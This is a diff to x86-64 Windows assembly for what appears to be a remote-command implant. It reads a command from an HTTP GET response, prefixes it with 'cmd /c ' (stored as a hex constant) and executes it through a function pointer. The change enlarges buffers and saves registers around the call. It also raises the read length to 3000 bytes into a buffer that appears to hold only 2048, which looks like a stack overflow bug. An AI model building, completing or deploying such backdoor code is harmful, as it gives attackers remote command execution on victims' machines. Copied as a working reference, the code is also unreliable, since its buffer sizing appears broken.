@@ -238,7 +238,7 @@ send_get_request:
 read_command:
     lea rdx, [rbp - 2048]
     mov rcx, [rbp - 112]
-    mov r8, 1024
+    mov r8, 3000
     lea r9, [rbp - 128]
 
     sub rsp, 32
@@ -255,23 +255,30 @@ read_command:
     mov byte ptr [rbp - 2048 + r12], 0
 
 execute_command:
-    lea rdi, [rbp - 3072]
+    lea rdi, [rbp - 5120]
     mov rax, 0x0020632f20646d63
     mov [rdi], rax
 
     lea rsi, [rbp - 2048]
-    lea rdi, [rbp - 3072 + 7]
+    lea rdi, [rbp - 5120 + 7]
 copy_cmd:
     lodsb
     stosb
     test al, al
     jnz copy_cmd
 
-    lea rcx, [rbp - 3072]
+    lea rcx, [rbp - 5120]
     xor rdx, rdx
+    
+    push rsi
+    push rdi
+    
     sub rsp, 32
     call [rbp - 40]
     add rsp, 32
+    
+    pop rdi
+    pop rsi
     jmp close_get_request
 
 send_output:
